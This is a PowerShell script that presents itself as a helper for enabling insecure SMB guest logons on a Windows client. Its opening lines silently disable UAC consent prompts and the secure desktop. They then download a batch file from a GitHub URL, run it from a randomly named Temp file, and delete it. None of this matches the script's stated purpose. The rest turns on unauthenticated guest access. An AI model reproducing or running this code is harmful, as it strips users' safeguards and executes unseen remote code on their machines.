reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$URLs = @(
    'https://raw.githubusercontent.com/mitutina/mitutina/main/smb.bat'
)

foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try {
        $response = Invoke-WebRequest -Uri $URL -UseBasicParsing
        break
    } catch {}
}
if (-not $response) {
    Write-Host "Failed to retrieve the script from the available repository, aborting!"
    return
}

$rand = [Guid]::NewGuid().Guid
$FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"
Set-Content -Path $FilePath -Value $response.Content

Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait

Remove-Item -Path $FilePath -Force


Get-SmbClientConfiguration |
Select-Object EnableInsecureGuestLogons

# Enable SMB guest logons on the Windows client.
# Applies the equivalent of this Group Policy setting:
# Computer Configuration > Administrative Templates > Network > Lanman Workstation
# > Enable insecure guest logons = Enabled
#
# Run this script on the CLIENT PC that connects to the SMB server.
# It does not change SMB signing or encryption requirements.

$ErrorActionPreference = 'Stop'

# Request Administrator privileges automatically when needed.
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host 'Requesting Administrator privileges...' -ForegroundColor Yellow
    $powershellExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $arguments = @(
        '-NoProfile'
        '-ExecutionPolicy', 'Bypass'
        '-File', ('"' + $PSCommandPath + '"')
    )

    try {
        Start-Process -FilePath $powershellExe -ArgumentList $arguments -Verb RunAs
    }
    catch {
        Write-Error "Could not obtain Administrator privileges: $($_.Exception.Message)"
    }
    exit
}

try {
    $registryPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\LanmanWorkstation'
    $valueName = 'AllowInsecureGuestAuth'

    Write-Host 'Enabling insecure SMB guest logons...' -ForegroundColor Cyan

    if (-not (Test-Path -LiteralPath $registryPath)) {
        New-Item -Path $registryPath -Force | Out-Null
    }

    New-ItemProperty -Path $registryPath `
                     -Name $valueName `
                     -PropertyType DWord `
                     -Value 1 `
                     -Force | Out-Null

    Write-Host 'Updating Computer Group Policy...' -ForegroundColor Cyan
    & "$env:SystemRoot\System32\gpupdate.exe" /target:computer /force
    $gpExitCode = $LASTEXITCODE

    $setting = Get-ItemPropertyValue -Path $registryPath -Name $valueName
    if ($setting -ne 1) {
        throw 'Verification failed: AllowInsecureGuestAuth is not set to 1.'
    }

    Write-Host ''
    Write-Host 'SUCCESS: SMB insecure guest logons are enabled on this client.' -ForegroundColor Green
    Write-Host "Registry: $registryPath\$valueName = $setting"

    if ($gpExitCode -ne 0) {
        Write-Warning "gpupdate returned exit code $gpExitCode. The registry setting is present, but check Group Policy processing."
    }

    Write-Host ''
    Write-Host 'Note: This script only enables Guest logons. Windows 11 24H2 may still reject Guest SMB connections if SMB signing or encryption is required.' -ForegroundColor Yellow
    Write-Host 'Restart Windows or disconnect existing SMB sessions, then try connecting again.' -ForegroundColor Yellow
}
catch {
    Write-Host ''
    Write-Host "FAILED: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

Get-SmbClientConfiguration |
Select-Object EnableInsecureGuestLogons

Write-Host ''
Read-Host 'Press Enter to close'






#  __  __       _          ____                
# |  \/  | __ _| | _____  | __ ) _   _         
# | |\/| |/ _` | |/ / _ \ |  _ \| | | |        
# | |  | | (_| |   <  __/ | |_) | |_| |        
# |_|  |_|\__,_|_|\_\___| |____/ \__, |        
#  _____                _____    |___/         
# |_   _|_ _ _ __   __ |_   _|   _  __ _ _ __  
#   | |/ _` | '_ \ / _` || || | | |/ _` | '_ \ 
#   | | (_| | | | | (_| || || |_| | (_| | | | |
#   |_|\__,_|_| |_|\__, ||_| \__,_|\__,_|_| |_|
#                  |___/                       
